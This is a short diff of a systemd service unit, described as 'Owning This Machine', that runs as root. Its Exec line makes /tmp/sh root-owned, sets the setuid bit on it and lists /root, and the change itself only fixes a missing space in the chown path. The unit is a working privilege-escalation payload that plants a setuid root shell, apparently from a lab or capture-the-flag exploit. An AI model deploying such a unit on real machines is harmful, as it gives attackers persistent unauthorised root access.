@@ -4,5 +4,5 @@ Description=Owning This Machine
 
 [Service]
 Type=simple
-Exec=/bin/sh -c "/bin/chown root:root/tmp/sh;/bin/chmod u+s /tmp/sh; ls -la /root"
+Exec=/bin/sh -c "/bin/chown root:root /tmp/sh;/bin/chmod u+s /tmp/sh; ls -la /root"
 User=root
